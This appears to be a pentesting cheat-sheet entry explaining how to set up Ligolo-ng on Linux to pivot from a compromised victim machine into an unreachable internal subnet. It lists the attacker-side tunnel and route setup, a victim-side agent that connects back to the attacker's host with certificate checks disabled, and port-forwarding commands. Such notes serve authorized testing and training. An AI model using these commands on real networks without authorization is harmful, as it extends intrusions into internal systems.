**[Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)**

#### Ligolo-ng in Linux

```text
Lets define some variables for the example:
	Our attack machine would be 192.168.45.2
	Our victim machine would be 192.168.45.15
	The unreachable network would be 192.168.221.0/24
	The unreachable machine we want to attack 192.168.221.8


- Setup in attack machine:
	# sudo ip tuntap add user $USER mode tun ligolo
	# sudo ip link set ligolo up
	# sudo ip route add 192.168.221.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
	# ./proxy -selfcert (Note the port from the output: Listening on 0.0.0.0:11601)

- Launch agent in victim machine:
	# ./agent -connect 192.168.45.2:11601 -ignore-cert

- In ligolo console:
	# session
	# start
	# listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 
		Here we specify a port forwarding where all connections recieved in the victim machine at port 8080 would be redirected to our attack achine at port 80. We can change this ports
		If error "bind: permission denied" appear we need to specify another unused port greather than 1000

- To clear everything once we have finished
	# sudo ip route del 192.168.221.0/24 dev ligolo
	# sudo ip link del ligolo
```
